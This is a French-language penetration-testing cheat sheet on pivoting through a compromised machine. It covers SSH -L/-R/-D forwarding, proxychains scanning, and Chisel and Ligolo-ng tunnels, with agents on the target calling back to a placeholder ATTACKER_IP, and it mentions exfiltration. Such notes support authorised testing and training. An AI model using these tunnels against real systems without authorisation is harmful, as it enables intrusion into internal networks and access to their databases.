# Pivoting
> Accéder à des services non exposés via une machine compromise

---

## Syntaxe SSH

| Flag | Forme | Rôle |
|------|-------|------|
| `-L` | `LOCAL_PORT:REMOTE_HOST:REMOTE_PORT` | Ramène un service distant vers toi |
| `-R` | `REMOTE_PORT:LOCAL_HOST:LOCAL_PORT` | Expose ton service vers la cible |
| `-D` | `LOCAL_PORT` | Proxy SOCKS sur ton port local |
| `-N` | — | Pas de shell, tunnel uniquement |

---

## 1 — Local Port Forwarding `-L`
> Accès à un service en `127.0.0.1` sur la cible

```bash
ssh -L 1234:127.0.0.1:5432 user@target -N
#       ^^^^          ^^^^
#    ton port local     port du service sur la cible (ici PostgreSQL)

psql -h 127.0.0.1 -p 1234 -U postgres
```

**Cas typique :** DB (PostgreSQL, MySQL, Redis) en `127.0.0.1` only sur la cible

---

## 2 — Remote Port Forwarding `-R`
> Expose ton service vers la cible

```bash
ssh -R 8080:127.0.0.1:80 user@target -N
# la cible accède à ton port 80 via son propre 8080
```

**Cas typique :** callback, exfil, serveur HTTP de staging

---

## 3 — Dynamic Port Forwarding `-D`
> Proxy SOCKS — pivot multi-services

```bash
ssh -D 1080 user@target -N
# crée un proxy SOCKS5 sur ton 127.0.0.1:1080
```

```ini
# /etc/proxychains.conf
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -p 5432,3306,6379 127.0.0.1
proxychains psql -h 127.0.0.1 -p 5432 -U postgres
```

**Cas typique :** énumération réseau interne, accès multi-cibles

---

## 4 — Chisel
> Tunnel TCP si SSH indisponible (passe en HTTP/S)

```bash
# Attaquant
chisel server -p 8000 --reverse

# Cible
chisel client ATTACKER_IP:8000 R:1234:127.0.0.1:5432
```

**Cas typique :** seuls les ports 80/443 sortent du réseau

---

## 5 — Ligolo-ng
> Pivot réseau pro — interface TUN, scan SYN possible

```bash
# Attaquant
./proxy -selfcert

# Cible
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

```bash
# Dans l'UI ligolo (attaquant)
session → start

# Ajouter la route vers le réseau interne
sudo ip route add 10.10.10.0/24 dev ligolo
```

**Avantage :** nmap SYN scan natif (contrairement à proxychains)

---

## Choisir son outil

| Outil | Quand l'utiliser |
|-------|-----------------|
| `-L` | 1 port précis, ciblé, discret |
| `-D` | Multi-services, exploration réseau |
| `chisel` | SSH bloqué, seul HTTP/S passe |
| `ligolo-ng` | Pivot full réseau, scan SYN, multi-subnet |

---

## Workflow

```
1. Enum        →  service en 127.0.0.1 détecté  (nmap / ss -tlnp / netstat)
2. Shell        →  accès obtenu sur la cible
3. Pivot        →  choisir selon le contexte (voir tableau ci-dessus)
4. Exploit      →  depuis l'attaquant, comme si le service était local
```